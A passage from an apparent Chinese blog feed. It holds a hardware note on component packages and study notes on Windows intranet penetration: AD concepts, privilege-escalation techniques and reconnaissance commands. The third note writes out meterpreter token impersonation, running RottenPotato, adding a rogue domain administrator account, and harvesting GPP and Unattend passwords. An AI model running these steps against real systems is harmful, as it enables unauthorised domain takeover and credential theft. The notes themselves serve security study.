<li>根据电容值是否可调分为：固定电容和可调电容</li>
</ul>
<hr>
<ul>
<li>无极性电容</li>
</ul>
<blockquote>
<p>原理图符号：<img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=1293600099,2681577360&fm=26&gp=0.jpg" alt></p>
</blockquote>
<blockquote>
<p>封装形式：RAD（从RAD-0.1 ~ RAD-0.4，后缀数字代表焊盘间距，单位为英寸）</p>
</blockquote>
<blockquote>
<p>常见的无极性电容主要有瓷片电容、独石电容和CBB电容</p>
</blockquote>
<hr>
<ul>
<li>有极性电容</li>
</ul>
<blockquote>
<p>原理图符号：<img src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=3198731425,16729189&fm=26&gp=0.jpg" alt></p>
</blockquote>
<blockquote>
<p>封装形式：RB（从RB-.2/.4 ~ RB- .5/1.0，前一个后缀数字的表示焊盘间距，后一个代表电容外型直径，单位都为英寸）</p>
<blockquote>
<p>一般来讲，标准尺<br>寸的电解电容的外形尺寸是焊盘间距的两倍。</p>
</blockquote>
</blockquote>
<ul>
<li><font color="red">一般来说，电容封装形式名称的后缀数值越大，相应的电容容量也越大</font></li>
</ul>
<hr>
<hr>
<h3 id="3-二极管"><a href="#3-二极管" class="headerlink" title="3.二极管"></a>3.二极管</h3><ul>
<li><p>种类：普通二极管、发光二极管、稳压二极管、快恢复二极管以及二极管指示灯、由多个发光二极管构成的七段数码管</p>
</li>
<li><p>原理图名称：DIODE （普通二极管） 、DIODE SCHOTTKY （肖特基二极管） 、DIODE TUNNEL （隧道二极管） 、DIODE VARACTOR （变容二极<br>管）和 ZENER1 ～ 3（稳压二极管） </p>
</li>
<li><p>常见封装：DIODE-0.4 、DIODE-0.7（后缀为焊盘间距，单位为英寸)和TO-220</p>
</li>
</ul>
<hr>
<hr>
<h3 id="4-二极管"><a href="#4-二极管" class="headerlink" title="4.二极管"></a>4.二极管</h3><ul>
<li><p>种类（根据PN结方向）：NPN型和PNP型（<font color="blue">晶体管外形完全相同，都包括 3 个引脚，即 b（基极） 、 c（集电极）和 e（发射极）</font>）</p>
</li>
<li><p>原理图符号：NPN、NPN1、PNP、PNP1</p>
<blockquote>
<p><font color="orange">达林顿复合管：将两个晶体管集成在一个元器件封装里（具有较大放大倍数）</font></p>
</blockquote>
</li>
<li><p>常见封装：TO-18（普通三极管）、TO-220（大功率三极管）、TO-3（大功率达林顿管）和TO-92A（普通三极管）</p>
</li>
</ul>
<hr>
<hr>
<h3 id="5-三端稳压源（78和79系列）"><a href="#5-三端稳压源（78和79系列）" class="headerlink" title="5.三端稳压源（78和79系列）"></a>5.三端稳压源（78和79系列）</h3><ul>
<li>种类：<blockquote>
<p>（输出电压的极性来分）三端稳压源可分为 78 系列和 79 系列两种。一般地，<font color="red"> 78 系列</font><br>的输出极性为<strong>正</strong>，比如“7805”、“7806”、“7810”、“7812”、“7815”和“7820”等；<font color="blue">79系列</font>的输出极性为<strong>负</strong>，比如 “7905”、“7912”、“7915”和“7918”等。</p>
</blockquote>
</li>
</ul>
<blockquote>
<p>(按输出电压的幅值是否可调)三端稳压源可分为<strong>电压固定</strong>和<strong>电压可调</strong>两种</p>
</blockquote>
<ul>
<li>原理图名称：VOLTREG</li>
<li>在实际使用过程中，用户常常在稳压源上附加<strong>散热片</strong>，以避免稳压源长时间工作在大负载下，散热条件不足，从而造成过高的温升而损坏元器件和电路板</li>
</ul>
<hr>
<hr>
<h3 id="6-整流桥"><a href="#6-整流桥" class="headerlink" title="6.整流桥"></a>6.整流桥</h3><p><img src="http://f11.baidu.com/it/u=522128679,919315213&fm=72" alt></p>
<ul>
<li>原理图符号：BRIDGE1 和 BRIDGE2</li>
</ul>
<hr>
<hr>
<h3 id="7-接插件"><a href="#7-接插件" class="headerlink" title="7.接插件"></a>7.接插件</h3><ul>
<li>种类：单排插座、双排插座和一些专用的接口</li>
</ul>
<hr>
<hr>
<h3 id="8-双列直插式集成电路芯片"><a href="#8-双列直插式集成电路芯片" class="headerlink" title="8.双列直插式集成电路芯片"></a>8.双列直插式集成电路芯片</h3><ul>
<li>方便安装与调试</li>
<li>在电路板调试过程中，常常在电路板上焊接IC座，然后将集成电路芯片插在IC座上，这样可以方便集成电路芯片的拆卸</li>
<li>IC座：</li>
</ul>
<p><img src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=4237591663,3561416429&fm=26&gp=0.jpg" alt></p>
<hr>
<hr>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a><strong>补充</strong></h2><ul>
<li>贴片电阻的元器件封装通常用数字表示，比如“0805”。这里的0805表示的贴片电阻的封装尺寸，与具体阻值没有关系，但与<font color="red">功率</font>有关。</li>
<li>一般情况下，贴片电阻的封装尺寸对其功率有以下关系：</li>
</ul>
<table>
<thead>
<tr>
<th>后缀</th>
<th>功率</th>
</tr>
</thead>
<tbody><tr>
<td>0402</td>
<td>1/16w</td>
</tr>
<tr>
<td>0603</td>
<td>1/10w</td>
</tr>
<tr>
<td>0805</td>
<td>1/8w</td>
</tr>
<tr>
<td>1206</td>
<td>1/4w</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>硬件</category>
      </categories>
      <tags>
        <tag>硬件</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透学习（一）</title>
    <url>/2021/01/30/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h2 id="内网渗透学习（一）"><a href="#内网渗透学习（一）" class="headerlink" title="内网渗透学习（一）"></a>内网渗透学习（一）</h2><h3 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h3><p><strong>内网</strong>也指局域网，是指在某一区域内由多台计算机互连而成的计算机组。</p>
<h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><p>为了不让网络混乱，将不同的计算机按功能分别列入不同工作组。<strong>工作组</strong>就像一个可以自由进出的社团，方便同组的计算机互相访问。工作组没有集中管理作用，工作组里的所有计算机都是对等的。</p>
<hr>
<h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p><strong>域</strong>（Domain）是一个由安全边界的计算机集合（可以理解成升级版的工作组）。域的安全管理控制机制更加严格。</p>
<blockquote>
<p>用户要想访问域内的资源，必须以合法的身份登陆域，而用户对域内的资源拥有什么样的权限，还取决于用户在域内的身份</p>
</blockquote>
<p><strong>域控制器</strong>（Domain Controller，DC）是域中的一台类似管理服务器的计算机，可以相当于一个单位的门禁系统。域控制器负责所有连入的计算机和用户的验证工作。DC中存在着由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。DC是整个域的通信枢纽。</p>
<h4 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h4><p><strong>单域</strong>：小型网络环境中，建立一个域就可以满足需求。在一个域内，一般至少两台域服务器（DC和备份DC）</p>
<p><strong>父域和子域</strong>：出于管理需要在网络中划分多个域。第一个域称为父域，各分部的域称为该域的子域。</p>
<p><strong>域树</strong>：多个域建立信任关系组成的集合。</p>
<p><strong>域森林</strong>：多个域树通过建立信任关系组成的集合。</p>
<p><strong>域名服务器</strong>（DNS）：用于实现域名和与之想对应的IP地址转换的服务器</p>
<hr>
<h3 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h3><p><strong>活动目录</strong>（Active Directory，AD）是指域环境中提供目录服务的组件。</p>
<p>目录用户存储有关的网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速、准确地从目录中找到其所需要的信息的服务。</p>
<p>其中将层次结构的目录及索引信息存储在数据库中，就是活动目录数据库（AD库）。</p>
<p>管理层次分明：A集团（域森林）-&gt; 子公司（域树）-&gt; 部门（域）-&gt; 员工</p>
<p>AD相当于树干</p>
<p>活动目录的功能：</p>
<ol>
<li>账号集中管理：所有账号均存储在服务器中，以便执行命令和重置密码等</li>
<li>软件集中管理：统一推送软件、安装网络打印机等。利用软件发布策略分发软件，可以让用户自由选择需要安装的软件</li>
<li>环境集中管理：统一客户端桌面、IE、TCP/IP协议等设置</li>
<li>增强安全性：统一部署杀毒软件和病毒扫描任务、集中管理用户的计算机权限、统一制定用户密码策略等。可以监控网络，对资料进行统一管理。</li>
<li>更可靠、更短的宕机时间：例如，利用AD控制用户访问权限，利用群集、负载均衡等技术对文件服务进行容灾设定。网络更可靠，宕机时间更短。</li>
</ol>
<hr>
<p><strong>DC和AD的区别</strong>：</p>
<ul>
<li>如果内网上的一台计算机安装了AD，它就变成了DC（用于存储AD库的计算机）</li>
<li>DC的本质是计算机，AD的本质是提供目录服务的组件</li>
</ul>
<hr>
<h3 id="安全域的划分"><a href="#安全域的划分" class="headerlink" title="安全域的划分"></a>安全域的划分</h3><p><strong>划分安全域的目的</strong>是将一组安全等级相同的计算机划入同一个网段。这个网段内的计算机拥有相同的网络边界，并在网络边界上通过部署防火墙来实现对其他安全域的<strong>网络访问控制策略</strong>（NACL），从而对其他IP访问作限制，将风险最小化。</p>
<p>一个安全域一般分为<strong>DMZ和内网</strong></p>
<p><strong>DMZ（非军事化区）称为隔离区。</strong>是为了解决安装防火墙后外部网络不能访问内部网络服务器的问题而设立的一个非安全系统和安全系统之间的缓冲区。</p>
<p>DMZ位于企业内部和外部网络之间。</p>
<p>DMZ不能访问内网，DMZ不能访问外网（此策略有例外，如mail服务）。内网可访问外网，内网可访问DMZ。外网不能访问内网，外网可以访问DMZ。</p>
<p>内网划分为：<strong>办公区</strong>和<strong>核心区</strong></p>
<p><strong>办公区</strong>一般会安装病毒软件、主机入侵检测产品等。（办公区一般能访问DMZ）</p>
<blockquote>
<p>运维使用堡垒机来统一管理用户的登录行为。攻击者如果想进入内网，一般会使用水坑攻击、鱼叉攻击等</p>
</blockquote>
<p><strong>核心区</strong>存储着企业最重要的数据、文档等信息资产，通过日志记录、安全审计等安全措施进行严密的保护，往往只有很少主机能访问。</p>
<blockquote>
<p>一般来说能直接访问的有运维和IT主管。所以攻击者会重点关注这些信息（横向渗透中优先查找这些主机）</p>
</blockquote>
<hr>
<h3 id="域内计算机分类"><a href="#域内计算机分类" class="headerlink" title="域内计算机分类"></a>域内计算机分类</h3><p><strong>域控制器</strong></p>
<p><strong>成员服务器</strong>：安装了服务器系统并加入了域，但没有安装AD的计算机</p>
<p><strong>客户机</strong></p>
<p><strong>独立服务器</strong>：和域无关。服务器既不加入域。也不安装活动目录</p>
<blockquote>
<p>域控制器是必须要有的，其他三种非必须</p>
</blockquote>
<hr>
<h3 id="域内权限"><a href="#域内权限" class="headerlink" title="域内权限"></a>域内权限</h3><p>组（Group）是用户账号的集合。管理员通过配置安全组访问权限，就可以为所有加入安全组的用户配置同样的权限</p>
<p>域内置组分为：<strong>域本地组</strong>、<strong>全局组、通用组</strong></p>
<p><strong>全局组相当于域账号（域管理员），域本地组相当于本地帐号（无法对其他成员计算机有权限）</strong></p>
<p>通用组的成员来自于域森林中任何域的用户账号、全局组和其他通用组，可以在该域森林的任何域中指派权限。（成员不是保存在各自的DC中国，而是保存在全局编录GC中的，任何变化都会导致全林复制）</p>
<p><strong>域本地组来自全林，作用于本域。全局组来自于全域，作用于全林。通用组来自全林，作用于全林。</strong></p>
<h4 id="A-G-DL-P策略"><a href="#A-G-DL-P策略" class="headerlink" title="A-G-DL-P策略"></a>A-G-DL-P策略</h4><p>A-G-DL-P策略是指将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。</p>
<ol>
<li>A 表示用户账号（Account）</li>
<li>G表示全局组（Global Group）</li>
<li>DL表示域本地组（Domain Local Group）</li>
<li>P表示资源权限（Permission）</li>
<li>U表示通用组（Universal Group）</li>
</ol>
<p>常用DL： Administrators（管理员组），最重要的权限； Remote Desktop Users（远程登录组）。</p>
<p>常用G： Domain Admins（域管理员组），最最重要的权限，一般来说域渗透是看重这个； Domain Users（域用户组）。</p>
<p>常见U： Enterprise Admins（企业系统管理员组）、 Schema Admins（架构管理员组），也是最最重要的权限。</p>
<hr>
<p>参考：内网安全攻防渗透测试实战指南</p>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>红队攻防</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>红队攻防</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透学习（三）</title>
    <url>/2021/02/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    <content><![CDATA[<h2 id="内网渗透学习（三）"><a href="#内网渗透学习（三）" class="headerlink" title="内网渗透学习（三）"></a>内网渗透学习（三）</h2><h3 id="权限分类"><a href="#权限分类" class="headerlink" title="权限分类"></a>权限分类</h3><ul>
<li>User：普通用户权限</li>
<li>Administrator：管理员权限。</li>
<li>System：系统权限。可以对SAM等敏感文件进行读取</li>
<li>TrustedInstaller：Windows中的最高权限</li>
</ul>
<hr>
<h3 id="系统内核溢出漏洞"><a href="#系统内核溢出漏洞" class="headerlink" title="系统内核溢出漏洞"></a>系统内核溢出漏洞</h3><h4 id="查看补丁"><a href="#查看补丁" class="headerlink" title="查看补丁"></a>查看补丁</h4><pre class=" language-bash"><code class="language-bash">systeminfo</code></pre>
<p>或者用wmic命令</p>
<pre class=" language-bash"><code class="language-bash">wmic qfe get Caption,Description,HotFixID,InstallOn</code></pre>
<h4 id="发现缺失补丁"><a href="#发现缺失补丁" class="headerlink" title="发现缺失补丁"></a>发现缺失补丁</h4><ul>
<li>手动比对</li>
<li>Metasploit的<code>post/windows/gather/enum_patches</code>模块</li>
<li>Windows Exploit Suggester工具</li>
<li>Powershell中的Sherlock脚本</li>
</ul>
<hr>
<h3 id="Windows操作系统配置错误"><a href="#Windows操作系统配置错误" class="headerlink" title="Windows操作系统配置错误"></a>Windows操作系统配置错误</h3><h4 id="系统服务权限配置错误"><a href="#系统服务权限配置错误" class="headerlink" title="系统服务权限配置错误"></a>系统服务权限配置错误</h4><p>如果一个低权限的用户对此类系统服务调用的可执行文件拥有写权限，就可以将该文件替换成任意可执行文件，并随着系统服务的启动获得系统权限。</p>
<p>系统服务权限配置错误（可写目录漏洞）有如下两种可能：</p>
<ul>
<li>服务未运行：攻击者会使用任意服务替换原来的服务，然后重启服务</li>
<li>服务正在运行且无法被终止：攻击者通常会利用DLL劫持技术并尝试重启服务来提权</li>
</ul>
<p><strong>利用工具</strong>：</p>
<ul>
<li>PowerUp脚本（Powershell使用）</li>
<li>Metasploit的service_permissions模块（选择AGGRESSIVE选项）</li>
</ul>
<h4 id="注册表键AlwaysInstallElevated"><a href="#注册表键AlwaysInstallElevated" class="headerlink" title="注册表键AlwaysInstallElevated"></a>注册表键AlwaysInstallElevated</h4><p>注册表键AlwaysInstallElevated是一个策略设置项。Windows允许低权限用户以System权限运行安装文件。</p>
<p>PathsAlwaysInstallElevated漏洞产生原因是用户开启了<strong>Windows Installer特权安装功能</strong></p>
<p>在组策略编辑器中选择：</p>
<ul>
<li><p>组策略-计算机配置-管理模块-Windows组件-Windows Installer-永远以高特权进行安装：选择启用</p>
</li>
<li><p>组策略-用户配置-管理模块-Windows组件-Windows Installer-永远以高特权进行安装：选择启用</p>
</li>
</ul>
<p>设置完后注册表的两个位置自动创建键值”1”</p>
<ul>
<li>HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</li>
<li>HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</li>
</ul>
<blockquote>
<p>Windows Installer是Windows操作系统的组件之一，专门用来管理和配置软件服务。除了安装程序，还用于管理软件的安装、组件的添加和删除、监视文件还原、通过回滚进行灾难恢复。</p>
<p>分为客户端安装服务（Msiexec.exe）和MSI文件两部分，他们是一起工作的。Windows Installer通过Msiexec.exe安装MSI文件包含的程序。MSI文件是Windows Installer的数据包，包含了安装和卸载软件需要用到的大量指令和数据。</p>
</blockquote>
<p>工具使用：</p>
<ul>
<li>PowerUp脚本</li>
</ul>
<blockquote>
<p>Get-Registry AlwaysInstallElevated模块用来检测</p>
<p>Write-UserAddMSI模块用来添加用户</p>
</blockquote>
<h4 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h4><p>可信任服务路径（包含空格且没有引号的路径）漏洞利用了Windows文件路径解析的特性并涉及服务路径的文件/文件夹权限（存在缺陷的服务程序利用了属于可执行文件的文件/文件夹的权限）。如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就存在漏洞。</p>
<p>该漏洞存在以下情况：</p>
<ul>
<li>如果路径与服务有关，就任意创建一个服务或者编译Service模板</li>
<li>如果路径与可执行文件有关，就任意创建一个可执行文件。</li>
</ul>
<p><strong>Trusted Service Paths 漏洞产生的原因：</strong></p>
<p>因为Windows服务通常都是以System权限运行的，所以系统在解析服务所对应的文件路径中的空格时，也会以系统权限进行。</p>
<p>例如：，有一个文件路径”C:\Program Files\Some Folder\Service.exe”。对于该路径的每一个空格，Windows都会尝试寻找并执行与空格前面的名字相匹配的程序。</p>
<p>Windows会依次尝试确定和执行下列程序：</p>
<ul>
<li>C:\Program.exe</li>
<li>C:\Program Files\Some.exe</li>
<li>C:\Program Files\Some Folder\Service.exe</li>
</ul>
<p>如果一个被恶意命名的可执行程序被上传到受影响的目录中，服务一旦重启，该程序就会以System权限运行。</p>
<p><strong>漏洞利用</strong>：</p>
<ul>
<li>手动利用</li>
</ul>
<pre class=" language-bash"><code class="language-bash">wmic <span class="token function">service</span> get name,displayname,pathname,startmdoe <span class="token operator">|</span> findstr /i <span class="token string">"Auto"</span> <span class="token operator">|</span> findstr /i /v <span class="token string">"C:\Windows\\"</span> <span class="token operator">|</span> findstr /i /v <span class="token string">""</span>"

icacls <span class="token punctuation">{</span>filepath<span class="token punctuation">}</span>

sc stop service_name
sc start service_name</code></pre>
<ul>
<li>Metasploit的Windows Service Trusted Path Privilege Escalation模块</li>
</ul>
<blockquote>
<p>在中止载荷进程之前将它迁移到其他进程中：set AutoRunScript migrate -f</p>
</blockquote>
<h4 id="自动安装配置文件"><a href="#自动安装配置文件" class="headerlink" title="自动安装配置文件"></a>自动安装配置文件</h4><p>在内网给多台机器配置同一环境时不会逐台配置，而是会使用脚本化批量部署。在这一过程中会使用安装配置文件。这些文件中包含所有的安装配置信息，其中的一些还可能包含本地管理员账号和密码等信息。</p>
<pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 搜索 Unatted.xml文件</span>
<span class="token function">dir</span> /b /s c:\Unatted.xml
<span class="token comment" spellcheck="true"># 接着打开查看是否含密码</span></code></pre>
<ul>
<li>Metasploit 的 post/windows/gather/enum_unattend模块</li>
</ul>
<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><p>查看计算机计划任务：</p>
<pre><code>schtasks /query /fo LIST /v</code></pre><p>工具利用：</p>
<ul>
<li>accesschk.exe</li>
</ul>
<hr>
<h3 id="组策略首选项提权"><a href="#组策略首选项提权" class="headerlink" title="组策略首选项提权"></a>组策略首选项提权</h3><ul>
<li><p>SYSVOL 是活动目录里面的一个用于存储公共文件服务器副本的共享文件夹，在域中的所有域控制器之间进行复制。</p>
</li>
<li><p>SYSVOL文件夹是在安装活动目录时自动创建的，主要用来存放登录脚本、组策略数据及其他域控制器需要的域信息等。</p>
</li>
<li><p>整个SYSVOL 目录在所有的域控制器中是自动同步和共享的，所有的域策略均存放在C:\Windows\SYSVOL\DOMAIN\Policies\ 目录中</p>
</li>
</ul>
<h4 id="常见的组策略首选项："><a href="#常见的组策略首选项：" class="headerlink" title="常见的组策略首选项："></a>常见的组策略首选项：</h4><ul>
<li>映射驱动器</li>
<li>创建本地用户</li>
<li>数据源</li>
<li>打印机配置</li>
<li>创建/更新服务</li>
<li>计划任务</li>
</ul>
<h4 id="组策略首选项提权分析"><a href="#组策略首选项提权分析" class="headerlink" title="组策略首选项提权分析"></a>组策略首选项提权分析</h4><h5 id="创建组策略"><a href="#创建组策略" class="headerlink" title="创建组策略"></a>创建组策略</h5><ol>
<li>在Group Policy Management Editor 中打开计算机配置界面，新建一个组策略，更新本地计算机用户的组策略首选项密码</li>
<li>将Domain Computer组添加到验证组策略对象列表中。然后将新建的组策略应用到域中所有的非域控制器中</li>
<li>手动更新组策略</li>
</ol>
<pre class=" language-bash"><code class="language-bash">gupdate</code></pre>
<h5 id="获取组策略的凭据"><a href="#获取组策略的凭据" class="headerlink" title="获取组策略的凭据"></a>获取组策略的凭据</h5><p>在SYSVOL 中搜索，可以找到包含cpassword的XML文件</p>
<ol>
<li>手动查找cpassword（浏览SYSVOL文件夹获取相关文件）</li>
<li>使用powershell获取cpassword（Get-GPPPassword.ps1）</li>
<li>使用Metasploit获取cpassword（post/windows/gather/credentials/gpp）</li>
<li>使用Empire获取cpassword（usemodule privesc/gpp）</li>
</ol>
<p>除了Group.xml，还有以下几个组策略首选项文件中有可选的Cpassword属性：</p>
<ul>
<li>Services/Services.xml</li>
<li>ScheduledTasks\ScheduledTasks.xml</li>
<li>Printers\Printers.xml</li>
<li>Drives\Drives.xml</li>
<li>DataSources\DataSources.xml</li>
</ul>
<hr>
<h3 id="绕过UAC提权分析"><a href="#绕过UAC提权分析" class="headerlink" title="绕过UAC提权分析"></a>绕过UAC提权分析</h3><p>如果操作系统是Windows Vista或更高，访问一些敏感的目录都需要经过UAC的认证</p>
<h4 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h4><p>UAC（User Account Control，用户账户控制）要求用户在执行可能影响计算机运行的操作或者在进行可能影响其他用户的设置之前，拥有相对应的权限或者管理员密码。</p>
<p>UAC的四种设置要求：</p>
<ul>
<li>始终通知</li>
<li>仅在程序试图更改我的计算机时通知我</li>
<li>仅在程序试图更改我的计算机时通知我（不降低桌面亮度）</li>
<li>从不提示</li>
</ul>
<p><strong>漏洞利用</strong>：</p>
<ul>
<li>Metesploit的exploit/windows/local/bypassuac模块</li>
<li>Metesploit的exploit/windows/local/ask模块</li>
<li>Nishang的Invoke-PsUACme</li>
<li>Empire中的bypassuac模块和bypassuac_wscript模块</li>
</ul>
<hr>
<h3 id="令牌窃取分析"><a href="#令牌窃取分析" class="headerlink" title="令牌窃取分析"></a>令牌窃取分析</h3><p>令牌（Token）是指系统中的临时密钥。其具有随机性和不可预测性。</p>
<ul>
<li>访问令牌（Access Token）代表访问控制操作主体的系统对象</li>
<li>密保令牌（Security Token）是一种用于实现计算机身份校验的物理设备</li>
<li>会话令牌（Session Token）是交互会话中唯一的身份标识符</li>
</ul>
<p>伪造令牌攻击的核心是Kerberos协议。</p>
<h4 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h4><p>前提：已经获得了目标机器的metepreter Shell。</p>
<pre><code>metepreter&gt; use incognito
metepreter&gt; list_tokens -u 
# 列出可用令牌</code></pre><p>两种类型令牌：</p>
<ul>
<li>Delegation Tokens：授权令牌，支持交互式登录</li>
<li>Impersonation Tokens：模拟令牌，支持非交互式会话</li>
</ul>
<pre><code>metepreter&gt; impersonate_token 令牌名
metepreter&gt; shell</code></pre><h4 id="Rotten-Potato本地提权"><a href="#Rotten-Potato本地提权" class="headerlink" title="Rotten Potato本地提权"></a>Rotten Potato本地提权</h4><pre><code>metepreter&gt; use incognito
metepreter&gt; list_tokens -u 
# 列出可用令牌</code></pre><p>下载RottenPotato.exe</p>
<p>上传并执行</p>
<pre><code>metepreter&gt; upload /root/RottenPotato/rottenpotato.exe
metepreter&gt; execute -HC -f rottenpotato.exe
metepreter&gt; impersonate_token &quot;令牌名&quot;
metepreter&gt; getuid</code></pre><h4 id="添加域管理员"><a href="#添加域管理员" class="headerlink" title="添加域管理员"></a>添加域管理员</h4><p>在meterpreter会话窗口中输入’ps’，查看系统进程。找到域管理进程，并使用migrate命令迁移到该进程。接着添加域用户：</p>
<pre><code>metepreter&gt; shell
net user shuteer test /ad /domain</code></pre><p>把添加的用户添加到域管理员组中：</p>
<pre><code>net group &quot;domain admins&quot; shuteer /ad /domain</code></pre><p>查看域管理员组：</p>
<pre><code>net group &quot;domain admins&quot; /domain</code></pre><p>在metepreter中可使用incognito来模拟域管理员，然后迭代系统中所有可用的身份验证令牌来添加域管理员。</p>
<pre><code>metepreter&gt; add_user shuteer test -h 1.1.1.2
metepreter&gt; add_group_user &quot;Domain Admins&quot; shuteer -h 1.1.1.2</code></pre><h4 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h4><p>使用Empire内置的==mimikatz==工具</p>
<hr>
<h3 id="无凭证条件下的权限获取"><a href="#无凭证条件下的权限获取" class="headerlink" title="无凭证条件下的权限获取"></a>无凭证条件下的权限获取</h3><h4 id="LLMNR和NetBIOS"><a href="#LLMNR和NetBIOS" class="headerlink" title="LLMNR和NetBIOS"></a>LLMNR和NetBIOS</h4><p><strong>LLMNR</strong>：本地链路多播名称解析，是一种域名系统数据包格式。当局域网中的DNS服务器不可用时，DNS客户端会使用LLMNR解析本地网段中机器的名称，知道DNS服务器恢复</p>
<p>LLMNR的工作流程：</p>
<ol>
<li>DNS客户端在自己的内部名称缓存中查询名称</li>
<li>如果没找到，主机将向DNS发送名称查询请求</li>
<li>如果主DNS没有回应或者收到了错误的信息，主机会向备DNS发送查询请求</li>
<li>如果备DNS没有回应或者收到了错误的信息，将使用LLMNR进行解析</li>
<li>主机通过UDP协议向组播地址224.0.0.252的5355端口发送多播查询请求，以获取主机名所对应的IP地址。查询范围仅限本地子网</li>
<li>本地子网中所有支持LLMNR的主机在收到请求后，会比对自己的主机名，如果不同则丢弃；如果相同，就向查询主机发送包含自己的IP地址的单播信息。</li>
</ol>
<p><strong>NetBIOS</strong>：一种网络协议，一般用在由十几台计算机组成的局域网中（根据NetBIOS协议广播获得计算机名称，并将其解析为相应的IP地址）。NetBIOS不支持IPv6</p>
<p>NetBIOS提供的三种服务：</p>
<ul>
<li>NetBIOS-NS（名称服务）：主要用于名称的注册和解析，以启动会话和分发数据报。该服务需要使用域名服务器来注册NetBIOS的名称。默认监听UDP 137端口，也可用使用TCP 137端口</li>
<li>Datagram Distribution Service（数据报分发服务）：无连接服务。该服务负责进行错误检测和恢复，默认监听UDP 138端口</li>
<li>Session Service（会话服务）：允许两台计算机建立连接，允许电子邮件跨越多个数据包进行传输，提供错误检测和恢复机制。默认使用TCP 139端口。</li>
</ul>
<p><strong>Net-NTLM Hash</strong>：</p>
<ul>
<li><p>NTLM Hash是指Windows操作系统的Security Account Manager中保存的用户密码散列值。NTLM Hash通常保存在Windows的SAM文件或者NTDS.DIT数据库中，用于对访问资源的用户进行身份验证。</p>
</li>
<li><p>Net-NTLM Hash是指网络环境中经过NTLM认证的散列值。挑战/响应验证中的“响应”就包含Net-NTLM Hash。使用Responder抓取的通常就是Net-NTLM Hash。</p>
</li>
</ul>
<h4 id="LLMNR和NetBIOS欺骗攻击"><a href="#LLMNR和NetBIOS欺骗攻击" class="headerlink" title="LLMNR和NetBIOS欺骗攻击"></a>LLMNR和NetBIOS欺骗攻击</h4><p>目标网络的DNS服务器因发生故障而无法提供服务时，会退回LLMNR和NBT-NS进行计算机名解析。</p>
<p>所用工具：==Responder==</p>
<p>若没有获得任何目标系统的相关信息和重要凭据，可先开启Responder的监听模式</p>
<p>之后利用SMB协议获取目标网络计算机的Net-NTLM Hash</p>
<hr>
<p>参考：内网安全攻防渗透测试实战指南</p>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>红队攻防</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>红队攻防</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透学习（二）</title>
    <url>/2021/02/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<h2 id="内网渗透学习（二）"><a href="#内网渗透学习（二）" class="headerlink" title="内网渗透学习（二）"></a>内网渗透学习（二）</h2><hr>
<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>内网信息收集主要包括这几点：</p>
<ol>
<li>我是谁？——对当前机器角色的判断</li>
<li>我在哪？——对当前机器所处网络环境的拓扑结构进行分析和判断</li>
<li>我在哪？——对当前机器所处区域的判断</li>
</ol>
<hr>
<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><h4 id="查询网络配置信息"><a href="#查询网络配置信息" class="headerlink" title="查询网络配置信息"></a>查询网络配置信息</h4><pre class=" language-c"><code class="language-c">ipconfig <span class="token operator">/</span>all</code></pre>
<hr>
<h4 id="查询操作系统及软件的信息"><a href="#查询操作系统及软件的信息" class="headerlink" title="查询操作系统及软件的信息"></a>查询操作系统及软件的信息</h4><p><strong>查询操作系统和版本信息</strong></p>
<pre class=" language-c"><code class="language-c">systeminfo <span class="token operator">|</span> findstr <span class="token operator">/</span>B <span class="token operator">/</span>C<span class="token punctuation">:</span><span class="token string">"OS Name"</span> <span class="token operator">/</span>C<span class="token punctuation">:</span><span class="token string">"OS Version"</span></code></pre>
<blockquote>
<p>如果是中文版则把”Name”换成”名称”，把”Version”换成”版本”</p>
</blockquote>
<p><strong>查询系统体系结构</strong></p>
<pre class=" language-c"><code class="language-c">echo <span class="token operator">%</span>PROCESSOR_ARCHITECTURE<span class="token operator">%</span></code></pre>
<p><strong>查看安装的软件及版本、路径</strong></p>
<p>Wmic：</p>
<pre class=" language-c"><code class="language-c">wmic product get name<span class="token punctuation">,</span>version</code></pre>
<p>Powershell:</p>
